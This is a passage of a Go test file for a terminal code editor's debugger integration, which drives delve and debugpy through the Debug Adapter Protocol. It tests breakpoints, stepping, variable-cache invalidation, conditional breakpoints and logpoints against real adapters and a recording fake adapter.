// TestDebugLiveEndToEndStopsAndPaints is the whole definition of done for Lane
// B stage 2, driven through the REAL editor against a REAL delve:
//
//	press F5 → the program runs → it stops on your breakpoint →
//	the editor opens that file and paints ▶ on the line.
//
// 🔴 Why this exists on top of the dap package's live oracle and the simulated
// app tests: those two prove the protocol client works and that the painting
// code paints. Neither proves the WIRING between them — that F5 reaches
// menuStartDebug, that the launch config names a program delve can build, that
// events posted from a background goroutine are routed by handleEvent to the
// right handler, or that the breakpoint the user set is the line the program
// stops on. Every one of those is a place this stage could be complete and
// still not work, and this fork has shipped exactly that failure three times.
func TestDebugLiveEndToEndStopsAndPaints(t *testing.T) {
	requireDlvForApp(t)

	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "go.mod"), []byte("module appfixture\n\ngo 1.21\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(dir, "main.go")
	src := "package main\n\nimport \"fmt\"\n\nfunc add(a, b int) int {\n\tsum := a + b\n\treturn sum\n}\n\nfunc main() {\n\tfmt.Println(add(2, 3))\n}\n"
	if err := os.WriteFile(path, []byte(src), 0o644); err != nil {
		t.Fatal(err)
	}

	a := newTestApp(t, dir)
	a.openFile(path)
	t.Cleanup(a.stopDebugSession)

	// Buffer line 5 is `sum := a + b`. Verified by TEXT, not by number: a
	// hardcoded line that happens to match proves nothing about the 1-based /
	// 0-based conversion this whole path depends on.
	const bpLine = 5
	if got := a.activeTabPtr().LineText(bpLine); !strings.Contains(got, "sum := a + b") {
		t.Fatalf("fixture line %d is %q, not the line meant to be marked", bpLine, got)
	}

	// Set the breakpoint the way a user does: move the cursor, press F9.
	a.activeTabPtr().MoveCursorTo(editor.Position{Line: bpLine, Col: 0}, false)
	a.handleKey(tcell.NewEventKey(tcell.KeyF9, 0, tcell.ModNone))
	a.syncBreakpoints()
	if len(a.breakpoints) != 1 {
		t.Fatalf("F9 did not register a breakpoint: %v", a.breakpoints)
	}

	// Press F5.
	a.handleKey(tcell.NewEventKey(tcell.KeyF5, 0, tcell.ModNone))
	if a.debug == nil {
		t.Fatal("F5 did not start a debug session")
	}

	if !pumpEvents(t, a, 180*time.Second, func() bool {
		return a.debug != nil && a.debug.stopped && a.debug.path != ""
	}) {
		state := "no session"
		if a.debug != nil {
			state = fmt.Sprintf("starting=%v running=%v stopped=%v", a.debug.starting, a.debug.running, a.debug.stopped)
		}
		t.Fatalf("the program never stopped on the breakpoint (%s). last status: %q", state, a.statusMsg)
	}

	a.draw()

	if got := a.debug.line; got != bpLine {
		t.Errorf("stopped on 0-based line %d, want %d", got, bpLine)
	}
	if got := a.activeTabPtr().LineText(a.debug.line); !strings.Contains(got, "sum := a + b") {
		t.Errorf("stopped on a line whose text is %q, not the marked line", got)
	}
	if got := gutterRuneAt(t, a, bpLine); got != '▶' {
		t.Errorf("the gutter on the stopped line is %q, want '▶'", got)
	}
	if got := a.activeTabPtr().Cursor.Line; got != bpLine {
		t.Errorf("the cursor is on line %d, want the stopped line %d", got, bpLine)
	}
	if !strings.Contains(a.debugStatus(), "main.go:6") {
		t.Errorf("status %q does not report the 1-based stopped location", a.debugStatus())
	}
	t.Logf("F5 → stopped at %s · gutter shows ▶", a.debugStatus())

	// And F5 again continues, running the program to completion.
	a.handleKey(tcell.NewEventKey(tcell.KeyF5, 0, tcell.ModNone))
	if !pumpEvents(t, a, 60*time.Second, func() bool { return a.debug == nil }) {
		t.Fatalf("F5 did not resume the program to completion; session still %+v", a.debug)
	}
	a.draw()
	if got := gutterRuneAt(t, a, bpLine); got == '▶' {
		t.Error("the stopped marker survived the program running to completion")
	}
	t.Logf("F5 again → ran to completion, marker cleared, status: %q", a.statusMsg)
}

// TestVariablesCacheDroppedOnStep is the guard for the most dangerous state in
// the debugger.
//
// 🔴 A variablesReference is a HANDLE the adapter allocates for one stop. Once
// the program runs again the adapter may reuse that number for something else
// or reject it — so a cache that survived a step would answer with ANOTHER
// FRAME'S VALUES and no error at all. Plausible and wrong, which is worse than
// broken: nothing on screen would tell the user the numbers belong to the line
// they were on before.
//
// Both invalidation paths are driven, because they are genuinely different
// events. `continued` is the adapter resuming; `stopped` is the program landing
// somewhere new — and a step produces the second with no guarantee of the
// first. Handling only one leaves a window in which stale references are served.
func TestVariablesCacheDroppedOnStep(t *testing.T) {
	populate := func(a *App, path string) {
		t.Helper()
		a.debug = &debugSession{
			adapter: "delve", running: true, stopped: true, threadID: 1,
			bound: map[string][]boundBreakpoint{},
		}
		a.handleDebugStopped(&debugStoppedEvent{
			when: time.Now(), path: path, line: 5, frame: "main.add", reason: "breakpoint", threadID: 1,
			frames: []debugFrame{{ID: 1000, Name: "main.add", Path: path, Line: 5}},
		})
		// Through the REAL write path, not by poking the map: a cache written
		// somewhere this test does not know about would not be dropped either.
		a.handleDebugVars(&debugVarsEvent{
			when: time.Now(), title: "Variables — main.add", ref: 1000,
			page: debugVarPage{vars: []debugVar{{Name: "sum", Value: "5", Type: "int"}}},
		})
		a.closePalette()
		if len(a.debug.varCache) != 1 {
			t.Fatalf("precondition: varCache holds %d entries, want the one just fetched", len(a.debug.varCache))
		}
		if len(a.debug.frames) != 1 {
			t.Fatalf("precondition: frames = %v", a.debug.frames)
		}
	}

	assertNothingStale := func(a *App, after string) {
		t.Helper()
		if len(a.debug.varCache) != 0 {
			t.Errorf("after %s the variables cache still holds %d reference(s): %v — "+
				"the next expansion would show another frame's values with no error",
				after, len(a.debug.varCache), a.debug.varCache)
		}
		if len(a.debug.frames) != 0 {
			t.Errorf("after %s the frame list survived: %v — its frame ids are dead handles too",
				after, a.debug.frames)
		}
		if a.debug.curFrame != 0 {
			t.Errorf("after %s curFrame is %d, indexing a frame list that no longer exists", after, a.debug.curFrame)
		}
	}

	// --- the adapter resumed on its own -----------------------------------
	a, path := debugFixture(t)
	populate(a, path)
	a.handleDAPEvent(&debugEvent{when: time.Now(), ev: dap.Event{Type: dap.TypeEvent, Event: dap.EventContinued}})
	assertNothingStale(a, "a continued event")

	// --- the program landed somewhere new ---------------------------------
	a, path = debugFixture(t)
	populate(a, path)
	body, _ := json.Marshal(dap.StoppedEvent{Reason: "step", ThreadID: 1})
	a.handleDAPEvent(&debugEvent{when: time.Now(), ev: dap.Event{
		Type: dap.TypeEvent, Event: dap.EventStopped, Body: body,
	}})
	assertNothingStale(a, "a stopped event")

	// --- and an UNREADABLE stopped event, which returns early --------------
	// The program still ran to produce it, so the drop must happen before any
	// error path bails out.
	a, path = debugFixture(t)
	populate(a, path)
	a.handleDAPEvent(&debugEvent{when: time.Now(), ev: dap.Event{
		Type: dap.TypeEvent, Event: dap.EventStopped, Body: json.RawMessage(`{"threadId":"not a number"}`),
	}})
	assertNothingStale(a, "an unreadable stopped event")

	// --- a step command clears it before the request even goes out ---------
	a, path = debugFixture(t)
	populate(a, path)
	a.debug.client = fakeAdapterClient(t)
	a.menuDebugStepOver()
	assertNothingStale(a, "issuing a step")
}

// TestStoppingRecordsTheWholeStack pins that the frames travel WITH the stop.
// Fetching them later would mean the call stack picker could describe a moment
// other than the one the ▶ is painted for.
func TestStoppingRecordsTheWholeStack(t *testing.T) {
	a, path := debugFixture(t)
	a.debug = &debugSession{adapter: "delve", running: true, bound: map[string][]boundBreakpoint{}}
	a.handleDebugStopped(&debugStoppedEvent{
		when: time.Now(), path: path, line: 5, frame: "main.add", reason: "breakpoint", threadID: 1,
		frames: []debugFrame{
			{ID: 1000, Name: "main.add", Path: path, Line: 5},
			{ID: 1001, Name: "main.main", Path: path, Line: 10},
		},
	})
	if len(a.debug.frames) != 2 {
		t.Fatalf("frames = %v, want both", a.debug.frames)
	}
	if a.debug.curFrame != 0 {
		t.Errorf("curFrame = %d, want the innermost frame on a fresh stop", a.debug.curFrame)
	}
	f, ok := a.currentFrame()
	if !ok || f.ID != 1000 {
		t.Errorf("currentFrame = %+v ok=%v, want the innermost", f, ok)
	}
}

// TestDebugLiveSteppingAndVariables is the definition of done for Lane B stage
// 3, driven through the REAL editor against a REAL delve:
//
//	F5 stops on the breakpoint → F10 advances one line → the variables
//	picker reads the local the program just computed.
//
// 🔴 Why this exists on top of internal/dap's live oracles and the simulated app
// tests above. Those prove the protocol client can step and read variables, and
// that the pickers render what they are handed. Neither proves the WIRING:
// that F10 reaches menuDebugStepOver rather than the old "reserved" flash, that
// the stopped event a step produces travels back through fetchStack and repaints
// the ▶, that the frame id handed to scopes() belongs to the frame on screen, or
// that the value shown is the one the program computed. Every one of those is a
// place this stage could be complete and still not work — and this fork has
// shipped exactly that failure three times.
//
// The step's destination is checked by the TEXT of the line, never its number.
func TestDebugLiveSteppingAndVariables(t *testing.T) {
	requireDlvForApp(t)

	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "go.mod"), []byte("module appfixture\n\ngo 1.21\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(dir, "main.go")
	src := "package main\n\nimport \"fmt\"\n\nfunc add(a, b int) int {\n\tsum := a + b\n\treturn sum\n}\n\nfunc main() {\n\tfmt.Println(add(2, 3))\n}\n"
	if err := os.WriteFile(path, []byte(src), 0o644); err != nil {
		t.Fatal(err)
	}

	a := newTestApp(t, dir)
	a.openFile(path)
	t.Cleanup(a.stopDebugSession)

	const bpLine = 5 // `sum := a + b`, verified by text below
	if got := a.activeTabPtr().LineText(bpLine); !strings.Contains(got, "sum := a + b") {
		t.Fatalf("fixture line %d is %q", bpLine, got)
	}
	a.activeTabPtr().MoveCursorTo(editor.Position{Line: bpLine, Col: 0}, false)
	a.handleKey(tcell.NewEventKey(tcell.KeyF9, 0, tcell.ModNone))
	a.syncBreakpoints()

	a.handleKey(tcell.NewEventKey(tcell.KeyF5, 0, tcell.ModNone))
	if !pumpEvents(t, a, 180*time.Second, func() bool {
		return a.debug != nil && a.debug.stopped && len(a.debug.frames) > 0
	}) {
		t.Fatalf("the program never stopped on the breakpoint; last status %q", a.statusMsg)
	}
	t.Logf("F5 → %s", a.debugStatus())

	// --- F10 steps over ---------------------------------------------------
	a.handleKey(tcell.NewEventKey(tcell.KeyF10, 0, tcell.ModNone))
	if !pumpEvents(t, a, 60*time.Second, func() bool {
		return a.debug != nil && a.debug.stopped && a.debug.line != bpLine
	}) {
		t.Fatalf("F10 did not move execution; still at %s (status %q)", a.debugStatus(), a.statusMsg)
	}
	a.draw()

	stoppedText := a.activeTabPtr().LineText(a.debug.line)
	if !strings.Contains(stoppedText, "return sum") {
		t.Fatalf("after F10 the program is on line %d whose text is %q, want the next statement `return sum`",
			a.debug.line+1, stoppedText)
	}
	if got := gutterRuneAt(t, a, a.debug.line); got != '▶' {
		t.Errorf("the ▶ did not follow the step: gutter on the new line is %q", got)
	}
	if got := gutterRuneAt(t, a, bpLine); got == '▶' {
		t.Error("the ▶ is still painted on the line the program has left")
	}
	if got := a.activeTabPtr().Cursor.Line; got != a.debug.line {
		t.Errorf("the cursor is on line %d, not the stopped line %d", got, a.debug.line)
	}
	t.Logf("F10 → %s · %q", a.debugStatus(), strings.TrimSpace(stoppedText))

	// --- the call stack names where we are --------------------------------
	a.menuDebugStack()
	if !a.paletteOpen {
		t.Fatalf("the call stack picker did not open; status %q", a.statusMsg)
	}
	stack := paletteLabels(a)
	if len(stack) < 2 {
		t.Errorf("call stack has %d frames, want main.add and its caller: %v", len(stack), stack)
	}
	if !strings.Contains(stack[0], "main.add") {
		t.Errorf("innermost frame = %q, want main.add", stack[0])
	}
	t.Logf("call stack: %v", stack)
	a.closePalette()

	// --- variables read the local the program just computed ----------------
	// 🔴 The assertion is on the VALUE. `sum` exists at all only because the
	// assignment ran, and it is 5 only if these are this frame's variables.
	a.menuDebugVariables()
	if !pumpEvents(t, a, 60*time.Second, func() bool { return a.paletteOpen }) {
		t.Fatalf("the variables picker never opened; status %q", a.statusMsg)
	}
	vars := paletteLabels(a)
	t.Logf("variables: %v", vars)
	found := false
	for _, v := range vars {
		if v == "sum = 5" {
			found = true
		}
	}
	if !found {
		t.Fatalf("no row reading %q in the variables picker: %v", "sum = 5", vars)
	}
	a.closePalette()

	// --- and the console holds what the program printed --------------------
	a.menuDebugStop()
	if a.debug != nil {
		t.Fatal("Stop left the session in place")
	}
}

// -----------------------------------------------------------------------------
// Lane B stage 4 — conditional breakpoints, logpoints, evaluate
// -----------------------------------------------------------------------------

// recordingAdapter is a fake debug adapter on the far end of a real dap.Client,
// which RECORDS every request the app puts on the wire and answers the ones the
// app waits for.
//
// 🔴 It exists because asserting on the flash alone is not an oracle for a
// capability gate. "The editor said delve cannot do log points" passes just as
// happily for an implementation that says so AND sends the field anyway — which
// is the bug, since the adapter then drops it silently and the breakpoint fires
// every time. Only the recorded traffic can tell the two apart.
type recordingAdapter struct {
	t    *testing.T
	conn net.Conn
	r    *bufio.Reader

	mu   sync.Mutex
	reqs []recordedRequest
}

// recordedRequest is one request as it actually appeared on the wire, decoded
// only as far as a map so a MISSING key is distinguishable from a zero value.
type recordedRequest struct {
	Command string
	Args    map[string]interface{}
}

// newRecordingAdapter wires an App-facing dap.Client to a fake that records
// everything and serves the handful of requests this stage issues.
func newRecordingAdapter(t *testing.T) (*dap.Client, *recordingAdapter) {
	t.Helper()
	ours, theirs := net.Pipe()
	f := &recordingAdapter{t: t, conn: theirs, r: bufio.NewReader(theirs)}
	client := dap.StartConn("fake", ours, dap.Handlers{})
	t.Cleanup(func() {
		_ = theirs.Close()
		_ = ours.Close()
	})
	go f.serve()
	return client, f
}

// serve answers requests until the pipe closes.
func (f *recordingAdapter) serve() {
	for {
		_ = f.conn.SetDeadline(time.Now().Add(30 * time.Second))
		body, err := readFramed(f.r)
		if err != nil {
			return
		}
		var req dap.Request
		if json.Unmarshal(body, &req) != nil {
			return
		}
		rec := recordedRequest{Command: req.Command, Args: map[string]interface{}{}}
		if raw, err := json.Marshal(req.Arguments); err == nil {
			_ = json.Unmarshal(raw, &rec.Args)
		}
		f.mu.Lock()
		f.reqs = append(f.reqs, rec)
		f.mu.Unlock()

		var respBody interface{} = struct{}{}
		if req.Command == "setBreakpoints" {
			respBody = map[string]interface{}{"breakpoints": verifiedAnswers(rec.Args)}
		}
		raw, err := json.Marshal(respBody)
		if err != nil {
			return
		}
		out, err := json.Marshal(dap.Response{
			Type: dap.TypeResponse, RequestSeq: req.Seq, Success: true,
			Command: req.Command, Body: raw,
		})
		if err != nil {
			return
		}
		if _, err := fmt.Fprintf(f.conn, "Content-Length: %d\r\n\r\n", len(out)); err != nil {
			return
		}
		if _, err := f.conn.Write(out); err != nil {
			return
		}
	}
}

// verifiedAnswers builds a positionally-matched, all-verified answer to a
// setBreakpoints request, echoing back the line that was asked for.
func verifiedAnswers(args map[string]interface{}) []map[string]interface{} {
	list, _ := args["breakpoints"].([]interface{})
	out := make([]map[string]interface{}, 0, len(list))
	for _, item := range list {
		bp, _ := item.(map[string]interface{})
		line, _ := bp["line"].(float64)
		out = append(out, map[string]interface{}{"verified": true, "line": int(line)})
	}
	return out
}

// readFramed reads one Content-Length framed message. A local copy because the
// framing helper in internal/dap is unexported — and the framing is exactly what
// this fake is here to observe, so borrowing the implementation under test would
// make the oracle agree with a bug.
func readFramed(r *bufio.Reader) ([]byte, error) {
	length := -1
	for {
		line, err := r.ReadString('\n')
		if err != nil {
			return nil, err
		}
		line = strings.TrimRight(line, "\r\n")
		if line == "" {
			break
		}
		if idx := strings.IndexByte(line, ':'); idx > 0 &&
			strings.EqualFold(strings.TrimSpace(line[:idx]), "content-length") {
			n, err := strconv.Atoi(strings.TrimSpace(line[idx+1:]))
			if err != nil {
				return nil, err
			}
			length = n
		}
	}
	if length < 0 {
		return nil, fmt.Errorf("message without Content-Length")
	}
	buf := make([]byte, length)
	if _, err := io.ReadFull(r, buf); err != nil {
		return nil, err
	}
	return buf, nil
}

// requests returns a snapshot of everything the app has sent.
func (f *recordingAdapter) requests() []recordedRequest {
	f.mu.Lock()
	defer f.mu.Unlock()
	return append([]recordedRequest(nil), f.reqs...)
}

// setBreakpointCalls returns just the setBreakpoints traffic.
func (f *recordingAdapter) setBreakpointCalls() []recordedRequest {
	var out []recordedRequest
	for _, r := range f.requests() {
		if r.Command == "setBreakpoints" {
			out = append(out, r)
		}
	}
	return out
}

// wireBreakpoints pulls the breakpoint list out of a recorded setBreakpoints.
func wireBreakpoints(r recordedRequest) []map[string]interface{} {
	list, _ := r.Args["breakpoints"].([]interface{})
	out := make([]map[string]interface{}, 0, len(list))
	for _, item := range list {
		bp, _ := item.(map[string]interface{})
		out = append(out, bp)
	}
	return out
}

// conditionalDebugFixture opens a Go file with breakpoints on two lines and a
// live session against a recording adapter with the given capabilities.
func conditionalDebugFixture(t *testing.T, caps dap.Capabilities) (*App, string, *recordingAdapter) {
	t.Helper()
	a, path := debugFixture(t)
	client, fake := newRecordingAdapter(t)

	tab := a.activeTabPtr()
	for _, line := range []int{5, 6} {
		tab.SetMark(line, editor.Mark{Kind: editor.MarkBreakpoint, Enabled: true, VerifiedLine: -1})
	}
	a.syncBreakpoints()
	if len(a.breakpoints) != 2 {
		t.Fatalf("fixture has %d breakpoints, want 2", len(a.breakpoints))
	}

	a.debug = &debugSession{
		adapter: "fake", running: true, client: client, caps: caps,
		bound: map[string][]boundBreakpoint{
			path: {{Requested: 5, Bound: 5, Verified: true}, {Requested: 6, Bound: 6, Verified: true}},
		},
	}
	return a, path, fake
}

// TestConditionRefusedWhenAdapterCannot is the capability gate, asserted on the
// WIRE and not only on the status line.
//
// 🔴 An adapter that never advertised supportsConditionalBreakpoints does not
// refuse a condition — it IGNORES the field. The breakpoint is accepted,
// reported verified, and then fires on every iteration of the loop the condition
// was written for, and nothing on screen distinguishes that from a condition
// that is merely wrong. So the message alone proves nothing: an implementation
// that flashes and sends it anyway passes a flash-only assertion while shipping
// exactly the bug. Both halves are checked here, in both directions.
func TestConditionRefusedWhenAdapterCannot(t *testing.T) {
	// --- the adapter cannot: refuse before anything reaches the wire --------
	a, _, fake := conditionalDebugFixture(t, dap.Capabilities{})
	a.activeTabPtr().MoveCursorTo(editor.Position{Line: 5, Col: 0}, false)

	a.menuSetCondition()

	if a.promptOpen {
		t.Error("the condition prompt opened against an adapter that cannot honour one; " +
			"the user would type an expression we already know will be discarded")
	}
	if !strings.Contains(a.statusMsg, "fake") ||
		!strings.Contains(a.statusMsg, "conditional breakpoints") {
		t.Errorf("status = %q, want a message naming the ADAPTER and the capability", a.statusMsg)
	}
	if got := fake.setBreakpointCalls(); len(got) != 0 {
		t.Fatalf("a refused condition still produced setBreakpoints traffic: %+v", got)
	}

	a.menuSetLogpoint()
	if a.promptOpen {
		t.Error("the logpoint prompt opened against an adapter with no supportsLogPoints")
	}
	if !strings.Contains(a.statusMsg, "log points") {
		t.Errorf("status = %q, want a message naming log points", a.statusMsg)
	}

	// --- and the START path strips rather than sends -----------------------
	// A condition typed with no session running reaches an adapter that cannot
	// honour it through pushBreakpoints, which must drop the field and say so.
	client, fake2 := newRecordingAdapter(t)
	_ = client
	groups := map[string][]Breakpoint{
		"/repo/main.go": {
			{Path: "/repo/main.go", Line: 5, Enabled: true, Condition: "i == 3"},
			{Path: "/repo/main.go", Line: 6, Enabled: true, LogMessage: "here"},
		},
	}
	ctx, cancel := contextWithTimeout(2 * time.Second)
	defer cancel()
	_, notes := pushBreakpoints(ctx, client, breakpointPolicy{adapter: "fake"}, groups)

	calls := fake2.setBreakpointCalls()
	if len(calls) != 1 {
		t.Fatalf("got %d setBreakpoints calls, want 1", len(calls))
	}
	for _, bp := range wireBreakpoints(calls[0]) {
		if _, present := bp["condition"]; present {
			t.Errorf("breakpoint %v carries a condition an adapter without the capability "+
				"would silently drop, making it fire every time", bp)
		}
		if _, present := bp["logMessage"]; present {
			t.Errorf("breakpoint %v carries a logMessage the adapter cannot honour", bp)
		}
	}
	joined := strings.Join(notes, " · ")
	if !strings.Contains(joined, "conditional breakpoints") || !strings.Contains(joined, "log points") {
		t.Errorf("notes = %q, want both refusals reported", joined)
	}

	// --- the positive control ----------------------------------------------
	// With the capability present the SAME call must put the field on the wire.
	// Without this half, an implementation that never sends a condition at all
	// would pass everything above.
	client3, fake3 := newRecordingAdapter(t)
	_, notes = pushBreakpoints(ctx, client3, breakpointPolicy{adapter: "fake", caps: dap.Capabilities{
		SupportsConditionalBreakpoints: true, SupportsLogPoints: true,
	}}, groups)
	if len(notes) != 0 {
		t.Errorf("notes = %v for an adapter that supports both", notes)
	}
	calls = fake3.setBreakpointCalls()
	if len(calls) != 1 {
		t.Fatalf("got %d setBreakpoints calls, want 1", len(calls))
	}
	sawCondition, sawLog := false, false
	for _, bp := range wireBreakpoints(calls[0]) {
		if bp["condition"] == "i == 3" {
			sawCondition = true
		}
		if bp["logMessage"] == "here" {
			sawLog = true
		}
	}
	if !sawCondition || !sawLog {
		t.Fatalf("a capable adapter did not receive the fields: %+v", wireBreakpoints(calls[0]))
	}
}

// contextWithTimeout is a tiny helper so the tests above read without repeating
// the context boilerplate four times.
func contextWithTimeout(d time.Duration) (context.Context, context.CancelFunc) {
	return context.WithTimeout(context.Background(), d)
}

// TestSetBreakpointsResendsTheWholeFile pins the whole-file rule at the moment
// it is easiest to get wrong: editing ONE breakpoint's condition.
//
// 🔴 setBreakpoints has no incremental form — every call REPLACES the complete
// set for that source. So the natural implementation of "the user changed this
// breakpoint, send it" clears every OTHER breakpoint in the file, and the
// symptom is breakpoints that stop working after you refine one of them, with
// nothing on screen to say they were deleted.
//
// RED against sending only the edited breakpoint: the request then carries one
// entry instead of two.
func TestSetBreakpointsResendsTheWholeFile(t *testing.T) {
	a, path, fake := conditionalDebugFixture(t, dap.Capabilities{
		SupportsConditionalBreakpoints: true, SupportsLogPoints: true,
	})

	// Put a condition on the breakpoint at line 5, the way a user does.
	a.activeTabPtr().MoveCursorTo(editor.Position{Line: 5, Col: 0}, false)
	a.menuSetCondition()
	if !a.promptOpen {
		t.Fatalf("the condition prompt did not open; status %q", a.statusMsg)
	}
	a.promptValue = []rune("i == 3")
	a.promptCursor = len(a.promptValue)
	a.promptSubmit()

	if !pumpEvents(t, a, 10*time.Second, func() bool { return len(fake.setBreakpointCalls()) > 0 }) {
		t.Fatalf("editing a condition never reached the adapter; requests: %+v", fake.requests())
	}

	calls := fake.setBreakpointCalls()
	last := calls[len(calls)-1]
	if got := last.Args["source"].(map[string]interface{})["path"]; got != path {
		t.Errorf("setBreakpoints source = %v, want %s", got, path)
	}

	bps := wireBreakpoints(last)
	if len(bps) != 2 {
		t.Fatalf("setBreakpoints carried %d breakpoint(s) after editing one of two: %+v — "+
			"the call REPLACES the file's set, so the other one has just been deleted",
			len(bps), bps)
	}

	// Adapter lines are 1-based; buffer lines 5 and 6 are lines 6 and 7.
	byLine := map[int]map[string]interface{}{}
	for _, bp := range bps {
		line, _ := bp["line"].(float64)
		byLine[int(line)] = bp
	}
	if byLine[6] == nil || byLine[7] == nil {
		t.Fatalf("the request carries lines %v, want the 1-based 6 and 7", byLine)
	}
	if byLine[6]["condition"] != "i == 3" {
		t.Errorf("the edited breakpoint carries condition %v, want %q", byLine[6]["condition"], "i == 3")
	}
	if _, present := byLine[7]["condition"]; present {
		t.Errorf("the UNedited breakpoint acquired a condition: %v", byLine[7])
	}

	// The mark itself kept the condition, so it persists and is exported.
	if m, ok := a.activeTabPtr().MarkAt(5); !ok || m.Condition != "i == 3" {
		t.Errorf("mark at line 5 = %+v, want the condition stored on it", m)
	}
}

// TestRemovingTheLastBreakpointClearsTheFileOnTheAdapter is the other half of
// whole-file, and the one an implementation that only iterates the CURRENT
// breakpoints cannot satisfy.
//
// 🔴 Deleting the last breakpoint in a file means that file no longer appears in
// the breakpoint list at all — so a resend that walks the list touches every
// file EXCEPT the one that changed, and the adapter stays armed on a breakpoint
// the editor no longer shows. A breakpoint you cannot delete.
func TestRemovingTheLastBreakpointClearsTheFileOnTheAdapter(t *testing.T) {
	a, path, fake := conditionalDebugFixture(t, dap.Capabilities{SupportsConditionalBreakpoints: true})

	tab := a.activeTabPtr()
	tab.ClearMark(5)
	tab.ClearMark(6)
	tab.MoveCursorTo(editor.Position{Line: 5, Col: 0}, false)
	a.afterBreakpointEdit()

	if !pumpEvents(t, a, 10*time.Second, func() bool { return len(fake.setBreakpointCalls()) > 0 }) {
		t.Fatalf("emptying a file never reached the adapter; requests: %+v", fake.requests())
	}
	last := fake.setBreakpointCalls()[0]
	if got := last.Args["source"].(map[string]interface{})["path"]; got != path {
		t.Errorf("cleared the wrong source: %v", got)
	}
	if bps := wireBreakpoints(last); len(bps) != 0 {
		t.Fatalf("setBreakpoints carried %d breakpoint(s) for a file with none left: %+v", len(bps), bps)
	}
}

// requireDebugpyForApp ends the test when no debugpy can be resolved, and turns
// that skip into a failure under HERDR_REQUIRE_DAP=1 — the same anti-skip gate
// requireDlvForApp uses, because a skipped end-to-end oracle reads as a pass.
func requireDebugpyForApp(t *testing.T, root string) {
	t.Helper()
	if cmd := dap.LocateDebugpy(root); cmd != nil {
		t.Logf("debugpy resolved from %s: %v", cmd.Origin, cmd.Argv)
		return
	}
	msg := "no debugpy could be resolved — `pip install debugpy`, or install the " +
		"MIT-licensed ms-python.debugpy VS Code extension"
	if os.Getenv("HERDR_REQUIRE_DAP") == "1" {
		t.Fatalf("HERDR_REQUIRE_DAP=1 but the live app oracle could not run: %s", msg)
	}
	t.Skip(msg)
}

// TestDebugLiveConditionalBreakpointThroughTheEditor is the definition of done
// for this stage at the UI layer, against a REAL delve:
//
//	F9 sets a breakpoint in a loop → the condition menu row puts `i == 3` on it
//	→ F5 runs → the program stops ONCE → Evaluate answers 3.
//
// 🔴 Why this exists on top of internal/dap's live oracle. That one proves the
// protocol client can send a condition. It does not prove that the menu row
// reaches menuSetCondition, that the prompt's value lands on the Mark, that
// syncBreakpoints carries it into the authoritative list, that enabledBreakpoints
// hands it to the launch path, or that Evaluate is aimed at the frame on screen.
// Every one of those is a place this stage could be complete and unreachable —
// which is the failure this fork has now shipped three times.
func TestDebugLiveConditionalBreakpointThroughTheEditor(t *testing.T) {
	requireDlvForApp(t)

	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "go.mod"), []byte("module appfixture\n\ngo 1.21\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(dir, "main.go")
	src := "package main\n\nimport \"fmt\"\n\nfunc main() {\n\ttotal := 0\n\tfor i := 0; i < 10; i++ {\n\t\ttotal += i\n\t}\n\tfmt.Println(total)\n}\n"
	if err := os.WriteFile(path, []byte(src), 0o644); err != nil {
		t.Fatal(err)
	}

	a := newTestApp(t, dir)
	a.openFile(path)
	t.Cleanup(a.stopDebugSession)

	// Buffer line 7 is `total += i`, the loop body. Checked by TEXT.
	const loopLine = 7
	if got := a.activeTabPtr().LineText(loopLine); !strings.Contains(got, "total += i") {
		t.Fatalf("fixture line %d is %q, not the loop body", loopLine, got)
	}
	a.activeTabPtr().MoveCursorTo(editor.Position{Line: loopLine, Col: 0}, false)
	a.handleKey(tcell.NewEventKey(tcell.KeyF9, 0, tcell.ModNone))

	// The condition goes on through the real UI: the menu action, then the
	// prompt modal, then Enter.
	a.menuSetCondition()
	if !a.promptOpen {
		t.Fatalf("the condition prompt did not open; status %q", a.statusMsg)
	}
	a.promptValue = []rune("i == 3")
	a.promptCursor = len(a.promptValue)
	a.promptSubmit()
	a.syncBreakpoints()
	if len(a.breakpoints) != 1 || a.breakpoints[0].Condition != "i == 3" {
		t.Fatalf("breakpoints = %+v, want one carrying the condition", a.breakpoints)
	}

	a.handleKey(tcell.NewEventKey(tcell.KeyF5, 0, tcell.ModNone))
	if !pumpEvents(t, a, 180*time.Second, func() bool {
		return a.debug != nil && a.debug.stopped && len(a.debug.frames) > 0
	}) {
		t.Fatalf("the program never stopped on the conditional breakpoint; status %q", a.statusMsg)
	}
	if got := a.debug.line; got != loopLine {
		t.Errorf("stopped on 0-based line %d, want the loop body %d", got, loopLine)
	}
	t.Logf("F5 → %s", a.debugStatus())

	// 🔴 The value, through the real Evaluate action, with the cursor on `i`.
	tab := a.activeTabPtr()
	col := strings.Index(tab.LineText(loopLine), "i")
	tab.MoveCursorTo(editor.Position{Line: loopLine, Col: col}, false)
	a.menuDebugEvaluate()
	if !pumpEvents(t, a, 30*time.Second, func() bool { return strings.Contains(a.statusMsg, "i = ") }) {
		t.Fatalf("Evaluate never answered; status %q", a.statusMsg)
	}
	if !strings.Contains(a.statusMsg, "i = 3") {
		t.Fatalf("Evaluate said %q, want `i = 3` — the condition was not honoured, or the "+
			"expression was evaluated in the wrong frame", a.statusMsg)
	}
	t.Logf("Evaluate → %q", a.statusMsg)

	// And continuing runs to completion: a dropped condition would stop nine
	// more times, so the session would still be alive here.
	a.handleKey(tcell.NewEventKey(tcell.KeyF5, 0, tcell.ModNone))
	if !pumpEvents(t, a, 60*time.Second, func() bool { return a.debug == nil }) {
		t.Fatalf("after continue the program stopped again; the condition fired more than "+
			"once. session %+v, status %q", a.debug, a.statusMsg)
	}
	t.Logf("F5 again → ran to completion: %q", a.statusMsg)
}

// TestDebugLiveDebugpyEndToEnd is the second adapter driven through the REAL
// editor: open a .py file, F9, F5, stop on the line.
//
// 🔴 This is where the delve-shaped assumptions in the APP layer would show up,
// and the dap package's own debugpy oracle cannot see any of them: whether
// hasDebuggableTab answers for Python at all, whether menuStartDebug sends the
// FILE rather than its directory as `program`, and whether the stdio transport
// survives the trip through Registry.Start. A green internal/dap suite and a
// green internal/app suite would both have been consistent with F5 doing nothing
// on a .py file.
func TestDebugLiveDebugpyEndToEnd(t *testing.T) {
	dir := t.TempDir()
	requireDebugpyForApp(t, dir)

	path := filepath.Join(dir, "fixture.py")
	src := "def add(a, b):\n    total = a + b\n    return total\n\n\nprint(add(2, 3))\n"
